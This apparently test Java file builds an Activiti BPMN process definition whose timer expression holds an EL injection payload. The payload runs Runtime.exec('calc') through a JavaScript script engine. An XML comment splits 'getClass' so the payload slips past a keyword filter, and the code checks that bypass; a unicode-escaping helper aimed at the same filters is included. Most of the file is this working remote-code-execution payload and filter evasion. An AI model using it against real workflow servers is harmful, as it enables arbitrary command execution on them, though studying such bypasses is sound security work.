package com.mechoy.test;

public class StringToUnionCode {
    public static void main(String[] args) throws Exception {
//        String input = "a=java.lang.Runtime.getRuntime().exec(\"calc\")";
//        String unicodeString = toUnicode(input);
//        System.out.println(unicodeString);
        xxx();
    }

    public static String toUnicode(String input) {
        StringBuilder unicode = new StringBuilder();
        for (int i = 0; i < input.length(); i++) {
            char c = input.charAt(i);
            unicode.append("\\u")
                    .append(String.format("%04x", (int) c));
        }
        return unicode.toString();
    }


    public static void xxx(){
        String s = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "\n" +
                "<definitions xmlns=\"http://www.omg.org/spec/BPMN/20100524/MODEL\"\n" +
                "             xmlns:activiti=\"http://activiti.org/bpmn\"\n" +
                "             typeLanguage=\"http://www.w3.org/2001/XMLSchema\"\n" +
                "             expressionLanguage=\"http://www.w3.org/1999/XPath\"\n" +
                "             targetNamespace=\"http://www.activiti.org/test\">\n" +
                "\n" +
                "    <process id=\"meeting\" name=\"meeting\" isExecutable=\"true\">\n" +
                "        <startEvent id=\"startEvent1\" name=\"Start\" activiti:initiator=\"host\">\n" +
                "            <timerEventDefinition>\n" +
                "                <timeDuration>\n" +
                "                    ${\"\".get<!---->Class().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\\'calc\\')')}\n" +
                "                </timeDuration>\n" +
                "            </timerEventDefinition>\n" +
                "        </startEvent>\n" +
                "        <userTask id=\"userTask2\" name=\"meeting2\" activiti:assignee=\"${person}\" activiti:formKey=\"meeting/signate\">\n" +
                "            <multiInstanceLoopCharacteristics isSequential=\"false\" activiti:collection=\"people\" activiti:elementVariable=\"person\"></multiInstanceLoopCharacteristics>\n" +
                "        </userTask>\n" +
                "        <userTask id=\"usertask3\" name=\"meeting3\" activiti:assignee=\"${host}\" activiti:formKey=\"meeting/input\">\n" +
                "        </userTask>\n" +
                "    </process>\n" +
                "</definitions>";
        if (!s.contains("getClass")){
            System.out.println("xxxxx");
        }

    }
}
